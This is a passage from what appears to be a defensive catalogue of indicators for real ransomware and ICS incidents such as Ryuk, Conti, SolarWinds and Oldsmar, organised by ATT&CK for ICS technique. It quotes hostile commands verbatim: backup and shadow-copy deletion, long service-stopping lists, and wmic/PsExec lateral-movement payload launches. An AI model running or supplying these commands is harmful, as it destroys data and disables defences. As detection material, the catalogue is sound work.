- T0834 - Native API: Anomalous Application Makes Application Programming Interface (API) Calls to Local Operating System (OS) Function: GetExtendedTcpTable, GetIpNetTable, NetServerEnum, NetServerGetInfo, DhcpEnumSubnets, DhcpGetSubnetInfo, DhcpEnumSubnetClients, GetTempPathW, GetTempFileNameW, WNetOpenEnumW, WNetEnumResourceW, CredEnumerateW, and SeDebugPrivilege: Anomalous Application Makes Application Programming Interface (API) Calls to Multiple Native Operating System (OS) Functions

- T0846 - Remote System Discovery: Anomalous Application Makes Application Programming Interface (API) Calls to Local Operating System (OS) Function: GetExtendedTcpTable, GetIpNetTable, NetServerEnum, NetServerGetInfo, DhcpEnumSubnets, DhcpGetSubnetInfo, DhcpEnumSubnetClients, GetTempPathW, GetTempFileNameW, WNetOpenEnumW, WNetEnumResourceW, CredEnumerateW, and SeDebugPrivilege: Anomalous Application Makes Application Programming Interface (API) Calls to Multiple Native Operating System (OS) Functions

- T0849 - Masquerading: Anomalous CHKDSK Screen Is Displayed on Host System

- T0859 - Valid Accounts: Anomalous PsExec Command Running on Local Host: C:\WINDOWS\dllhost.dat \\w.x.y.z -accepteula -s -d C:\Windows\System32\rundll32.exe C:\Windows\perfc.dat,#1 60

- T0862 - Supply Chain Compromise: Anomalous Authentication through Dynamic Link Library (DLL) Associated with Software Update: Through ZvitPublishedObjects.dll

- T0866 - Exploitation of Remote Services: Anomalous Binary Signature Over TCP Port 445: 9EC8253D9EC8253D9EC8253D9EC8253D, 3D9EC8253D9EC8253D9EC8253D9EC825, 253D9EC8253D9EC8253D9EC8253D9EC8, and C8253D9EC8253D9EC8253D9EC8253D9E: Multiple Anomalous Binary Signatures Over TCP Port 445

- T0867 - Lateral Tool Transfer: Anomalous Command Prompt Entry

- T0872 - Indicator Removal on Host: Anomalous Calls to Windows Library: FreeLibrary

- T0879 - Damage to Property: Anomalous Unrecoverable Damage to Computers and Servers: 49,000 Computers and 3,500 Servers

- T0886 - Remote Services: Anomalous PsExec Command Running on Local Host: Wbem\wmic.exe /node:"w.x.y.z" /user:"username" /password:"password" "process call create "C:\Windows\System32\rundll32.exe \"C:\Windows\perfc.dat\" #1 60"

## LOCKERGOGA RANSOMWARE ATTACK ON NORSK HYDRO 2019

- T0809 - Data Destruction: Anomalous System Behavior on Local Host: Anomalous Deletion of Data: .bak Files,| .iso Files,| .doc Files,| .dot Files,| .docx Files,| .docb Files,| .dotx Files,| .wkb Files,| .xlm Files,| .xml Files,| xls Files,| .xlsx Files,| .xlt Files,| .xltx Files,| .xlw Files,| .ppt Files,| .pps Files,| .pot Files,| .ppsx Files,| .pptx Files,| .posx Files,| .potx Files,| .sldx Files,| .pdf Files,| .db Files,| .sql Files,| .cs Files,| .ts Files,| .js Files,| .py Files: Deletion of Multiple Filetypes

- T0811 - Data from Information Repositories: Anomalous System Behavior on Local Host: A Directory Service Object Was Modified (Windows Event ID 5136)

- T0826 - Loss of Availability: Anomalous Down Time: Inability to Access Systems Within the Operational Technology (OT) Network: For Extended Duration: For 30 Days

- T0827 - Loss of Control: Anomalous Behavior of Controlled Process: Controlled Process Operating in Degraded State: Manual Operations: For Extended Duration: 30 Days

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Revenue: Approximately $71 Million

- T0829 - Loss of View: Anomalous System Behavior on Local Host: Systems Inaccessible: Approximately 23,000 Personal Computers (PCs)

- T0843 - Program Download: Anomalous Network Traffic: From Local Host to External Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request: Associated with Anomalous Executable: Cobalt Strike

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: "taskkill" Command

- T0859 - Valid Accounts: Anomalous System Behavior on Local Host: An Account was Successfully Logged On (Windows Event ID 4624): Anomalous Timestamp

- T0863 - User Execution: Anomalous Network Traffic: From External Host to Local Host: Access from External Host

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From External Host to Local Host: Simple Mail Transfer Protocol (SMTP) Over TCP Port 25

- T0881 - Service Stop: Anomalous Down Time: 23,000 Host Systems Shut Down: For Extended Duration: 30 Days

- T0888 - Remote System Information Discovery: Anomalous Code Execution: From Local Host to Internal Domain: Associated with PowerShell

## KANSAS WATER UTILITY INSIDER CYBER ATTACK 2019

- T0822 - External Remote Services: Anomalous Application Logs on Local Remote Service Host: GoToMyPC Application: File Path user/appdata/local/temp/logmeinlogs

- T0826 - Loss of Availability: Anomalous Behavior of Controlled Process: Anomalous Loss of Availability of Controlled Process: Water Filtration Process

- T0859 - Valid Accounts: Anomalous Application Logs on Local Remote Service Host: GoToMyPC Application: File Path user/appdata/local/temp/logmeinlogs

- T0864 - Transient Cyber Asset: Anomalous Usage of Remote Access Service: GoToMyPC: Using Personally Owned Cellular Device

- T0881 - Service Stop: Anomalous Behavior of Controlled Process: Anomalous Shutdown of Controlled Process: Water Filtration Process

- T0883 - Internet Accessible Device: Anomalous Application Logs on Local Host: GoToMyPC Application: File Path user/appdata/local/temp/logmeinlogs

## 2020 SOLARWINDS SUPPLY CHAIN COMPROMISE AGAINST A U.S. ENERGY PROVIDER

- T0802 - Automated Collection: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Domain Name System (DNS) Over UDP Port 53: To Anomalous Domain: Anomalous Canonical Name (CNAME) Domain Name System (DNS) Requests

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: auditpol /GET /category:”Detailed Tracking”

- T0822 - External Remote Services: Anomalous Network Traffic: From External Server to Local Host: From External Server to Local Host with Security Information and Event Management (SIEM) Software: SolarWinds Orion Platform

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Productivity: Downtime Due to Investigation and Remediation

- T0834 - Native API: Executable Calls Binary on Local Host: Executable Calls Dynamic Link Library (DLL): SolarWinds.BusinessLayerHost.exe Calls SolarWinds.Orion.Core.BusinessLayer.dll

- T0849 - Masquerading: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Domain Name System (DNS) Over UDP Port 53: To Anomalous Domain: Anomalous Canonical Name (CNAME) Domain Name System (DNS) Requests

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: Powershell Command: [renamed-adfind].exe -h [machine] -f (name=”Domain Admins”) member -list | [renamed-adfind].exe -h [machine] -f objectcategory=* > .\[folder]\[file].[log|txt]

- T0859 - Valid Accounts: Anomalous Network Traffic: From External Server to Local Host: From External Server to Local Host with Security Information and Event Management (SIEM) Software: SolarWinds Orion Platform: Remote Procedure Call (RPC) Over TCP Port 135

- T0862 - Supply Chain Compromise: Anomalous Network Traffic: From External Server to Local Host: From External Server to Local Host with Security Information and Event Management (SIEM) Software: SolarWinds Orion Platform: Up to Two Weeks After Executing Installer Patch File: CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp

- T0863 - User Execution: Anomalous Network Traffic: From External Server to Local Host: From External Server to Local Host with Security Information and Event Management (SIEM) Software: SolarWinds Orion Platform: Up to Two Weeks After Executing Installer Patch File: CORE-2019.4.5220.20574-SolarWinds-Core-v2019.4.5220-Hotfix5.msp

- T0867 - Lateral Tool Transfer: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Hypertext Transfer Protocol (HTTP) Over TCP Port 80

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Domain Name System (DNS) Over UDP Port 53: To Anomalous Domain: Anomalous Canonical Name (CNAME) Domain Name System (DNS) Requests

- T0871 - Execution through API: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Over TCP Port 17777: Executable Making Calls to Application Programmatic Interface (API): SolarWinds.BusinessLayerHost.exe Calls SolarWinds.CredentialsSolarWinds.Credentials.Orion.WebApi.exe

- T0872 - Indicator Removal on Host: Anomalous Command Issued Via Command-Line: netsh advfirewall firewall delete rule

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: netsh advfirewall firewall add rule name=”[rulename1]” protocol=UDP dir=out localport=137 action=block

- T0882 - Theft of Operational Information: Anomalous Command Issued Via Command-Line: "Net use [drive]: https://d.docs.live.net/[user -id] /u:[username] [password]"

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Local Host to External Server: From Local Host with Security Information and Event Management (SIEM) Software to External Server: SolarWinds Orion Platform: Domain Name System (DNS) Over UDP Port 53: To Anomalous Domain: Anomalous Canonical Name (CNAME) Domain Name System (DNS) Requests

- T0888 - Remote System Information Discovery: Anomalous Command Issued Via Command-Line: [renamed-adfind].exe -h [machine] -f (name=”Domain Admins”) member -list |

- T0889 - Modify Program: Anomalous Command Issued Via Command-Line: sc \\[dest_machine] stop [service name][perform lateral move Source->Dest]

## DOPPELPAYMER RANSOMWARE ATTACK ON PETROLEOS MEXICANOS (PEMEX) 2019

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: C:\Windows\system32\diskshadow.exe /s C:\Users\User\Appdata\Local\Temp\<random>.tmp

- T0816 - Device Restart/Shutdown: Anomalous System Behavior on Local Host: Host Reboots: Host Displays Anomalous Text on Reboot

- T0817 - Drive-by Compromise: Anomalous Network Traffic: From External IP to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Productivity: Business Processes Inaccessible: Billing

- T0832 - Manipulation of View: Anomalous Modification of Files on Local Host: ".doppeled" Appended to Filenames

- T0834 - Native API: Anomalous Execution of Binary on Local Host: Dynamic Link Library (DLL): advapi32.dll

- T0849 - Masquerading: Presence of Anomalous Executable on Local Host: Signed Executable: Logitech Plug-In: SpotLife WebAlbum Service Plug-In: Spoofed Signature

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: C:\Windows\system32\icacls.exe <service_name> /reset

- T0859 - Valid Accounts: An Account Failed to Log On (Windows Event ID 4625): Associated with Anomalous Remote IP

- T0863 - User Execution: Anomalous Network Traffic: From External IP to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From Local Host to External IP: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0867 - Lateral Tool Transfer: Anomalous Command Issued Via Command-Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External IP to Local Host: File Transfer Protocol (FTP) Over TCP Port 22

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: C:\Windows\system32\icacls.exe <service_name> /reset

- T0882 - Theft of Operational Information: Anomalous Command Issued Via Command-Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

- T0885 - Commonly Used Port: Anomalous Network Traffic: From External IP to Local Host: File Transfer Protocol (FTP) Over TCP Port 22

- T0886 - Remote Services: Anomalous Network Traffic: From External IP to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389

## EKANS RANSOMWARE ATTACK ON HONDA

- T0809 - Data Destruction: Anomalous Change of File Extensions

- T0826 - Loss of Availability: Anomalous Encryption of Files, Resulting in Inability to Access Files for Authorized Users

- T0828 - Loss of Productivity and Revenue: Disruption of Controlled Process

- T0840 - Network Connection Enumeration: Anomalous Network Statistics Regarding Domain Reqests

- T0849 - Masquerading: Anomalously Large Executable

- T0859 - Valid Accounts: Domain Controller Activity Timestamp (Timestamp associated with login ID)

- T0881 - Service Stop: Anomalous Business Process Interruptions

- T0886 - Remote Services: Internet-Facing RDP Connections

## MUMBAI 2020 POWER OUTAGE-RELIABILITY FAILURE EXPOSES MALWARE INTRUSION

- T0807 - Command-Line Interface: Anomalous System Behavior on Local Host: A New Process Has Been Created (Windows Event ID 4688)

- T0826 - Loss of Availability: Anomalous Device Alarms: In the Information Technology (IT) Environment

- T0828 - Loss of Productivity and Revenue: Anomalous Behavior of Controlled Process: Capability Loss: 3508 MW

- T0843 - Program Download: Anomalous Network Traffic: From External Host to Local Host: Anomalous Plug-Ins Downloaded to Host: Anomalous ShadowPad Plug-Ins

- T0849 - Masquerading: Anomalous System Behavior on Local Host: A New Process Has Been Created (Windows Event ID 4688)

- T0853 - Scripting: Anomalous System Behavior on Local Host: A Privileged Service Was Called (Windows Event ID 4673)

- T0862 - Supply Chain Compromise: Anomalous Access Requests to Data Repository: Requests to Software Supplier Code Repositories

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External Host to Local Host: Inbound Domain Name System (DNS) Traffic: Containing Encrypted Strings

- T0871 - Execution through API: Anomalous Network Traffic: From External Host to Local Host: Containing Anomalous Binaries: Anomalous Function Code Related to Shadowpad Plug-Ins

- T0872 - Indicator Removal on Host: Anomalous System Behavior on Local Host: An Attempt Was Made to Access an Object (Windows Event ID 4663)

- T0874 - Hooking: Anomalous System Behavior on Local Host: A New Process Has Been Created (Windows Event ID 4688)

- T0884 - Connection Proxy: Anomalous Network Traffic: From Local Host to Anomalous External Proxy: Hypertext Transfer Protocol (HTTP) Traffic Over TCP Port 8080

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Local Host to Anomalous External Proxy: Hypertext Transfer Protocol (HTTP) Traffic Over TCP Port 8080

- T0888 - Remote System Information Discovery: Anomalous Network Traffic: From External Host to Local Host: Hypertext Transfer Protocol (HTTP) Traffic Over TCP Port 8080

## RYUK RANSOMWARE ATTACK ON UNIVERSAL HEALTH SERVICES 2020

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: C:\WINDOWS\system32\cmd.exe /C ipconfig

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk, del /s /f /q d:\*.VHD d:\*.bac d:\*.bak d:\*.wbcat d:\*.bkf d:\Backup*.* d:\backup*.* d:\*.set d:\*.win d:\*.dsk, del /s /f /q e:\*.VHD e:\*.bac e:\*.bak e:\*.wbcat e:\*.bkf e:\Backup*.* e:\backup*.* e:\*.set e:\*.win e:\*.dsk, del /s /f /q f:\*.VHD f:\*.bac f:\*.bak f:\*.wbcat f:\*.bkf f:\Backup*.* f:\backup*.* f:\*.set f:\*.win f:\*.dsk, del /s /f /q g:\*.VHD g:\*.bac g:\*.bak g:\*.wbcat g:\*.bkf g:\Backup*.* g:\backup*.* g:\*.set g:\*.win g:\*.dsk, del /s /f /q h:\*.VHD h:\*.bac h:\*.bak h:\*.wbcat h:\*.bkf h:\Backup*.* h:\backup*.* h:\*.set h:\*.win h:\*.dsk, and del %0: Multiple del Commands Issued Via Command-Line

- T0816 - Device Restart/Shutdown: Anomalous System Behavior on Local Host: Windows is Shutting Down (Windows Event ID 4609)

- T0817 - Drive-by Compromise: Anomalous Network Traffic: From External Host to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0826 - Loss of Availability: Anomalous System Behavior on Local Host: Windows Process Disabled: Excel.exe, Firefoxconfig.exe, Infopath.exe, Isqlplussvc.exe, Mspub.exe, Mydesktopservice.exe, Outlook.exe, Powerpnt.exe, Onenote.exe, Oracle.exe, Steam.exe, Syntcime.exe, Wordpard.exe, Winword.exe, and Mbamtray.exe: Multiple Windows Processes Disabled

- T0828 - Loss of Productivity and Revenue: Anomalous Loss of Revenue: $67 Million

- T0834 - Native API: Anomalous Execution of Native Operating System (OS) Application Programming Interface (API): Windows Application Programming Interface (API): ShellExecuteW, GetWindowsDirectoryW, VirtualAlloc, WriteProcessMemory, and CreateRemoteThread: Multiple Executions of Windows Application Programming Interface (API)

- T0846 - Remote System Discovery: Anomalous Command Issued Via Command-Line: C:\Windows\system32\cmd.exe /C rundll32 C:\Windows\system32\SQL.dll, StartW

- T0849 - Masquerading: Anomalous Network Traffic: From Local Host to External Host: Domain Name System (DNS) Over TCP/UDP Port 53

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: C:\WINDOWS\system32\cmd.exe /C net group “enterprise admins” /domain

- T0859 - Valid Accounts: Anomalous Network Traffic: From External IP to Local Host: Remote Desktop Protocol (RDP) Over TCP Port 3389

- T0863 - User Execution: Anomalous Network Traffic: From External Host to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Hypertext Transfer Protocol (HTTP) GET Request

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From Local Host to External Host: Domain Name System (DNS) Over TCP/UDP Port 53: docs.google.com

- T0867 - Lateral Tool Transfer: Anomalous Command Issued Via Command-Line: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From Local Host to External Host: Domain Name System (DNS) Over TCP/UDP Port 53

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: net stop avpsus /y, net stop McAfeeDLPAgentService /y, net stop mfewc /y, net stop BMR Boot Service /y, and net stop NetBackup BMR MTFTP Service /y: Multiple net stop Commands Issued Via Command-Line

- T0885 - Commonly Used Port: Anomalous Network Traffic: From Local Host to External Host: Domain Name System (DNS) Over TCP/UDP Port 53

- T0888 - Remote System Information Discovery: Anomalous Command Issued Via Command-Line: C:\Windows\system32\cmd.exe /C Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8

## REMOTE ACCESS ATTACK ON OLDSMAR WATER TREATMENT FACILITY 2021

- T0822 - External Remote Services: Anomalous Network Traffic: From External IP to Internal Domain Controller: Remote Desktop Protocol (RDP) Over TCP Port 5938

- T0823 - Graphical User Interface: Anomalous System Behavior on Local Host: On Human-Machine Interface (HMI): Cursor Movement Not Performed by User: At 1:30 PM EST on 5 February 2021

- T0831 - Manipulation of Control: Anomalous Behavior of Controlled Process: Anomalous Change in Water Treatment Chemical Concentration: Increase in Concentration of Sodium Hydroxide: From 100 PPM to 11,000 PPM

- T0836 - Modify Parameter: Anomalous Behavior of Controlled Process: Anomalous Change in Water Treatment Chemical Concentration: Increase in Concentration of Sodium Hydroxide: From 100 PPM to 11,000 PPM

- T0859 - Valid Accounts: Privileged Information Disclosed on Public Site: Internal Credentials: Oldsmar Credentials

- T0883 - Internet Accessible Device: Anomalous Network Traffic: From External IP to Internal Domain Controller: Remote Desktop Protocol (RDP) Over TCP Port 5938

## JBS FOODS RANSOMWARE ATTACK 2021

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: C:\Windows\System32\cmd.exe"/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default}bootstatuspolicy ignoreallfailures

- T0820 - Exploitation for Evasion: Anomalous Behavior Associated with Native Executable on Local Host: explorer.exe

- T0826 - Loss of Availability: Anomalous Call to System Binary on Local Host: user32.dll: SystemParametersInfoW function

- T0827 - Loss of Control: Anomalous System Behavior on Local Host: Anomalous Allocation of All Processing Capacity: Multiple Threads

- T0828 - Loss of Productivity and Revenue: Anomalous Expense: Ransom Payment: $11,000.00

- T0832 - Manipulation of View: Anomalous Call to System Binary on Local Host: user32.dll: SystemParametersInfoW function

- T0834 - Native API: Anomalous Command Issued Via Command-Line: 'runas': Creation of New Process Using ShellExecute: With Administrative Rights

- T0846 - Remote System Discovery: Anomalous Command Issued Via Command-Line: 'netsh advfirewall firewall set rule group=*Network Discovery* new enable=Yes'

- T0849 - Masquerading: Anomalous Behavior Associated with Native Executable on Local Host: explorer.exe

- T0853 - Scripting: Anomalous Behavior Associated with Native Executable on Local Host: regsvr32.exe

- T0859 - Valid Accounts: Anomalous Behavior Associated with Native Executable on Local Host: explorer.exe

- T0863 - User Execution: Anomalous Behavior Associated with Native Executable on Local Host: rundll32.exe

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From External Host to Local Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: Download of Anomalous Executable on Local Host: Microsoft-Word[.]exe

- T0866 - Exploitation of Remote Services: Anomalous Network Traffic: From External Host to Local Host: Oracle WebLogic Over TCP Port 7001

- T0869 - Standard Application Layer Protocol: Anomalous Network Traffic: From External Host to Local Host: The Onion Router (TOR) Traffic

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: C:\Windows\System32\cmd.exe"/c vssadmin.exe Delete Shadows /All /Quiet & bcdedit /set {default}bootstatuspolicy ignoreallfailures

- T0882 - Theft of Operational Information: Anomalous Network Traffic: From Local Host to External Host: Hypertext Transfer Protocol (HTTP) Over TCP Port 80: With Host 45.86.163.78: Outside Country of Operations: Between 1 March 2021 and 25 May 2021: Transfer of 5 Terabytes (TB) of Unecrypted Operational Data

- T0884 - Connection Proxy: Anomalous Network Traffic: From External Host to Local Host: The Onion Router (TOR) Traffic

- T0885 - Commonly Used Port: Anomalous Network Traffic: From External Host to Local Host: Oracle WebLogic Over TCP Port 7001

- T0886 - Remote Services: Anomalous Network Traffic: From Local Host to External Host: Hypertext Transfer Protocol Secure (HTTPS) Over TCP Port 443: With Host 45.86.163.78

- T0888 - Remote System Information Discovery: Anomalous Call to System Binary on Local Host: user32.dll: Whitelisting Hosts by Keyboard Language Setting: GetKeyboardLayoutList: Return Value "True": Values x18 through x44 Inclusive: 0x0000041c (Albanian), 0x0000042b (Armenian Eastern), 0x0002042b (Armenian Phonetic), 0x0003042b (Armenian Typewriter), 0x0001042b (Armenian Western), 0x0001042C (Azerbaijani (Standard)), 0x0000082c (Azerbaijani Cyrillic), 0x0000042C (Azerbaijani Latin), 0x00000423 (Belarusian), 0x0000201a (Bosnian (Cyrillic)), 0x00000429 (Central Kurdish), 0x0000041a (Croatian), 0x00000439 (Devanagari-INSCRIPT), 0x00000425 (Estonian), 0x00000438 (Faeroese), 0x0001083b (Finnish with Sami), 0x00000437 (Georgian), 0x00020437 (Georgean (Ergonomic)), 0x00010437 (Georgean (QWERTY)), 0x00030437 (Georgian Ministry of Education and Science Schools), 0x00040437 (Georgian (Old Alphabets)), 0x00010439 (Hindi Traditional), 0x0000043f (Kazakh), 0x00000440 (Kyrgyz Cyrillic), 0x00020426 (Latvian (Standard)), 0x00010426 (Latvian (Legacy)), 0x00010427 (Lithuanian), 0x00000427 (Lithuanian IBM), 0x00020427 (Lithuanian Standard), 0x0000042f (Macedonia (FYROM)), 0x0001042f (Macedonia (FYROM) -Standard), 0x0000043a (Maltese 47-Key), 0x0001043a (Maltese 48-Key), 0x0000043b (Norwegian with Sami), 0x00000429 (Persian), 0x00050429 (Persian (Standard), 0x00000418 (Romanian (Legacy)), 0x00020418 (Romanian (Programmers)), 0x00010418 (Romanian (Standard), 0x00000419 (Russian), 0x00020419 (Russian - Mnemonic), 0x00010419 (Russian (Typewriter)), 0x0002083b (Sami Extended Finland-Sweden), 0x0001043b (Sami Extended Norway), 0x00000c1a (Serbian (Cyrillic), 0x0000081a (Serbian (Latin)), 0x00000432 (Setswana), 0x0000041b (Slovak), 0x0001041b (Slovak (QWERTY)), 0x00000424 (Slovenian), 0x0001042e (Sorbian Extended), 0x0002042e (Sorbian Standard), 0x0000042e (Sorbian Standard - Legacy), 0x0000041d (Swedish), 0x0000083b (Swedish with Sami), 0x00000428 (Tajik), 0x00010444 (Tatar), 0x00000444 (Tatar (Legacy)), 0x0000041e (Thai Kedmanee), 0x0002041e (Thai Kedmanee (non-ShiftLock), 0x0001041e (Thai Pattachote), 0x0003041e (Thai Pattachote (non-ShiftLock), 0x0001041f (Turkish F), 0x0000041f (Turkish QoETO.exe), 0x00000442 (Turkmen), 0x00000422 (Ukrainian), 0x00020422 (Ukrainian (Enhanced)), 0x00000420 (Urdu), 0x00000843 (Uzbeck Cyrillic), and 0x0000042a (Vietnamese): Multiple Return Values "True"

- T0890 - Exploitation for Privilege Escalation: Anomalous Command Issued Via Command-Line: 'runas': Creation of New Process Using ShellExecute: With Administrative Rights

## CONTI RANSOMWARE ATTACK ON THE HEALTH SERVICE EXECUTIVE OF IRELAND 2021

- T0807 - Command-Line Interface: Anomalous Command Issued Via Command-Line: Anomalous Absence of Common Executable Parameters/Arguments

- T0809 - Data Destruction: Anomalous Command Issued Via Command-Line: WMIC.exe

- T0826 - Loss of Availability: Anomalous Command Issued Via Command-Line: cmd.exe /C _COPY.bat

- T0828 - Loss of Productivity and Revenue: Anomalous Expense: $100 Million Direct Recovery Cost

- T0834 - Native API: Anomalous Execution of Executable on Local Host: rundll32.exe, regsvr32.exe, runonce.exe, services.exe, svchost.exe, wuauclt.exe, mstsc.exe, and dllhost.exe: Anomalous Execution of Multiple Executables on Local Host

- T0840 - Network Connection Enumeration: Anomalous Command Issued Via Command-Line: Command-Line CONTAINS (“systeminfo” OR “whoami” OR “net users” or “net localgroup Administrators” OR “route print” OR “ipconfig /all” OR “arp -a” OR “wmic ntdomain” OR “wmic netuse” OR “wmic nicconfig” OR “Get-ADComputer” OR “net accounts” OR “Invoke-ShareFinder”)

- T0846 - Remote System Discovery: Anomalous Command Issued Via Command-Line: cmd.exe /C portscan <IP ranges> icmp 1024

- T0849 - Masquerading: Anomalous Command Issued Via Command-Line: regsvr32 ..[Dll Name].[Random Extension],DllRegisterServer

- T0853 - Scripting: Anomalous Command Issued Via Command-Line: cmd.exe /C adft.bat, cmd.exe /C *.bat, cmd.exe /C cp.bat, cmd.exe /C copy_files_srv.bat for /f %%i in (srv.txt) do copy “C:\ProgramData\doc.dll” \\%%i\c$\ProgramData\doc.dll, cmd.exe /C wm_start.bat for /f %%i in (srv.txt) do wmic /node: %%i process call create “rundll32.exe C:\Programdata\doc.dll entryPoint”, cmd.exe /C copy_files_work.bat, cmd.exe /C _COPY.bat and, cmd.exe /C _EXE.bat: Multiple cmd.exe Commands Issued Via Command-Line with Different Arguments

- T0859 - Valid Accounts: Anomalous Command Issued Via Command-Line: cmd.exe /C cp.bat

- T0863 - User Execution: Anomalous Network Traffic: From Local Host to External Host: Domain Name System (DNS) Over TCP/UDP Port 53

- T0865 - Spearphishing Attachment: Anomalous Network Traffic: From External Host to Local Server: Simple Mail Transfer Protocol (SMTP) Over TCP Port 25

- T0867 - Lateral Tool Transfer: Anomalous Command Issued Via Command-Line: Anomalous Absence of Common Executable Parameters/Arguments

- T0869 - Standard Application Layer Protocol: Anomalous Command Issued Via Command-Line: Anomalous Absence of Common Executable Parameters/Arguments

- T0881 - Service Stop: Anomalous Command Issued Via Command-Line: net stop “Acronis VSS Provider” /y, net stop “Enterprise Client Service” /y, net stop “SQLsafe Backup Service” /y, net stop “SQLsafe Filter Service” /y, net stop “Veeam Backup Catalog Data Service” /y, net stop AcronisAgent /y, net stop AcrSch2Svc /y, net stop Antivirus /y, net stop ARSM /y, net stop BackupExecAgentAccelerator /y, net stop BackupExecAgentBrowser /y, net stop BackupExecDeviceMediaService /y, net stop BackupExecJobEngine /y, net stop BackupExecManagementService /y, net stop BackupExecRPCService /y, net stop BackupExecVSSProvider /y, net stop bedbg /y, net stop DCAgent /y, net stop EPSecurityService /y, net stop EPUpdateService /y, net stop EraserSvc11710 /y, net stop EsgShKernel /y, net stop FA_Scheduler /y, net stop IISAdmin /y, net stop IMAP4Svc /y, net stop McShield /y, net stop McTaskManager /y, net stop mfemms /y, net stop mfevtp /y, net stop MMS /y, net stop mozyprobackup /y, net stop MsDtsServer /y, net stop MsDtsServer100 /y, net stop MsDtsServer110 /y, net stop MSExchangeES /y, net stop MSExchangeIS /y, net stop MSExchangeMGMT /y, net stop MSExchangeMTA /y, net stop MSExchangeSA /y, net stop MSExchangeSRS /y, net stop MSOLAP$SQL_2008 /y, net stop MSOLAP$SYSTEM_BGC /y, net stop MSOLAP$TPS /y, net stop MSOLAP$TPSAMA /y, net stop MSSQL$BKUPEXEC /y, net stop MSSQL$ECWDB2 /y, net stop MSSQL$PRACTICEMGT /y, net stop MSSQL$PRACTTICEBGC /y, net stop MSSQL$PROFXENGAGEMENT /y, net stop MSSQL$SBSMONITORING /y, net stop MSSQL$SHAREPOINT /y, net stop MSSQL$SQL_2008 /y, net stop MSSQL$SYSTEM_BGC /y, net stop MSSQL$TPS /y, net stop MSSQL$TPSAMA /y, net stop MSSQL$VEEAMSQL2008R2 /y, net stop MSSQL$VEEAMSQL2012 /y, net stop MSSQLFDLauncher /y, net stop MSSQLFDLauncher$PROFXENGAGEMENT /y, net stop MSSQLFDLauncher$SBSMONITORING /y, net stop MSSQLFDLauncher$SHAREPOINT /y, net stop MSSQLFDLauncher$SQL_2008 /y, net stop MSSQLFDLauncher$SYSTEM_BGC /y, net stop MSSQLFDLauncher$TPS /y, net stop MSSQLFDLauncher$TPSAMA /y, net stop MSSQLSERVER /y, net stop MSSQLServerADHelper100 /y, net stop MSSQLServerOLAPService /y, net stop MySQL57 /y, net stop ntrtscan /y, net stop OracleClientCache80 /y, net stop PDVFSService /y, net stop POP3Svc /y, net stop ReportServer /y, net stop ReportServer$SQL_2008 /y, net stop ReportServer$SYSTEM_BGC /y, net stop ReportServer$TPS /y, net stop ReportServer$TPSAMA /y, net stop RESvc /y, net stop sacsvr /y, net stop SamSs /y, net stop SAVAdminService /y, net stop SAVService /y, net stop SDRSVC /y, net stop SepMasterService /y, net stop ShMonitor /y, net stop Smcinst /y, net stop SmcService /y, net stop SMTPSvc /y, net stop SQLAgent$BKUPEXEC /y, net stop SQLAgent$ECWDB2 /y, net stop SQLAgent$PRACTTICEBGC /y, net stop 